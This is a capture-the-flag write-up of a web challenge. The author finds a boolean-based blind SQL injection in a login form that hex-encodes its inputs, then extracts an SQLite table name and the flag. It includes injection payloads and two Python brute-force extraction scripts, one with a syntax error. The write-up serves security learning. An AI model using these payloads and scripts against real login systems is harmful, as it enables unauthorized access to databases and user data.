# B!inded! (Web Challenge)

## Description 

```
No fuzzing is needed, just get the flag , Format : EGCERT{flag}
Points : 200

```

## Enumeration 
 
once i opened the challenge i found this page 

[loginpage](./assets/ieee/login-page)

And we have a hint on the description that tell us we don't need to fuzzing so our entry is the login page 
so i tried ```admin``` ```admin``` in the user and pass , i have got response ```wrong password``` so now i know that we have admin username . 

i tried again with aboelnour and pass and i have got that user not found

so i fired up my burp and send ```a``` in user and ```a``` in pass

And i have noticed that username and password converted to hex and sperated by four zeros 
for example a = 61 in hex so our request will be like this 

```
POST /login HTTP/1.1
Host: challenge.com

61000061

```

and the response of this request is

```
user not found 
```


And from the challenge name i got that it might be blind sqli 

so i typed ```aboelnour"``` in username and ```0``` in pass , i have got internal server error.
then i typed ```aboelnour" or 1=1 -- -``` and B00M i have got response ```Wrong Password```  , to make sure i tried ```aboelnour" or 1=0 -- -``` and got response ```User not found``` , so it is boolean based sqli 

so let's enum our sql type 

i tried ```admin" select version()-- -``` but i got internal server error 

so i tried ```admin"select sqlite_version()-- -``` , and response was Wrong password , so our db is ```SQLite``` 

-----

## Extract table name  

+ First of all , we have SQL Server SUBSTRING() Function , this function use to extracts some characters from a     string. 

### Ex :

+ substring("Aboelnour",1,1) , output will be --> A

+ substring("Aboelnour",2,1) , output will be --> b 

and so on

+ we have alos SQL LIKE Operator : you can check it on "https://www.w3schools.com/sql/sql_like.asp"



so if we have table name = users and column name = user we can enum users with query like this 

```substring((select user from users where user like '%a%'),1,1) = 'a'```

operator ```like '%a%``` : will finds any values that have a on any position  

then i have searched about how to extract tables from SQLitedb and found this payloads in payloadsALLTheThings on github : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-version


I got this query to Extract table names

```
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

I have modified it to this query below to find any table have fl in any position  

```
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_% AND like '%fl%'
```

so our final payload will be : 

```admin"and SUBSTRING((SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' and tbl_name like '%fl%'),1,1) = 'f' -- -```

i tried it and i have got User not found so the first char not f 

So i have tried

```admin"and SUBSTRING((SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' and tbl_name like '%fl%'),1,1) = 'F' -- -``` , i have got Wrong password so the first character is F 

but it will be hard to make it manually so i have wrote python script to got table name 

----

## Exploit code 

first we need to convert our username to hex and concate it with 000061 , 61 is the password
second we need to brute force chars in i place then check if Wrong in response so we got the right char and increase step with 1 to find the second char and so on 


```python
import requests
import string

url = 'http://challenge.com/login'
myobj = '%s000061'
returned_text="Wrong"
table=""
step = 1
for j in range(1,len(string.printable)):
	for i in string.printable:
		payload = f'admin"and SUBSTRING((SELECT tbl_name FROM sqlite_master WHERE type=\'table\' and tbl_name NOT like \'sqlite_%\' and tbl_name like \'%fl%\'),{step},1) = \'{i}\' -- -'
		p = payload.encode('utf-8').hex()
		p = myobj % p 
		x = requests.post(url, data=p)
		if returned_text in x.text :
			step += 1
			print(x.text)
			print(i)
			table = table + i
			print("found more char : ", table)

print("Flag table name : " , table)
```

Afer running this script i got 
```
Flag table name : Flag_jnk249
```

so now we have the table name 

before brute force column i have try this payload 

```
admin"select flag from Flag_jnk249-- -
```
and i got Wrong password so our column name is flag 

i modified my previse script to got the flag 


```
import requests
import string

url = 'http://challenge.com/login'
myobj = '%s000061'
flag=""
returned_text="Wrong"
step = 1
for j in range(1,len(string.printable)):
	for i in string.printable:
		payload = f'admin"and SUBSTRING((SELECT flag from Flag_jnk249),{step},1) = \'{i}\' -- -'
		p = payload.encode('utf-8').hex()
		p = myobj % p 
		x = requests.post(url, data=p)
		if returned_text in x.text :
			step += 1
			print(x.text)
			print(i)
			flag = flag + i
			print("found more char : ", flag)

print("FLAG : " flag)
```

```
AND finnaly i have got FLAG : EGCERT{flaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag}
```


#### Linked in : https://www.linkedin.com/in/maboelnour12/
#### Facebook : https://www.facebook.com/maboelnour12
